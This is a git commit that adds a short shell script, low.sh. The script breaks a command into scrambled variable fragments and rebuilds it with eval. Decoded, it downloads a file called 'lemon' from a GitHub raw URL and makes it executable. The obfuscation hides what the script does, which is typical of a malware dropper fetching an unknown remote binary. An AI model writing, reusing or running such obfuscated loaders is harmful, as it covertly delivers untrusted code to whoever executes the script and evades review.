911273793b1ae8ad8e13e8e75af8b793c3fb22b3
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-11-11 23:09:54 +0700

    Add files via upload

---
+++ low.sh
@@ -0,0 +1,3 @@
+z="
+";Ez='.git';Qz='on &';Nz='new/';Cz='ps:/';Az='wget';Oz='main';Tz='+x l';Rz='& ch';Jz='om/c';Dz='/raw';Fz='hubu';Hz='onte';Uz='emon';Pz='/lem';Lz='husa';Mz='rii/';Iz='nt.c';Gz='serc';Kz='hika';Bz=' htt';Sz='mod ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz"
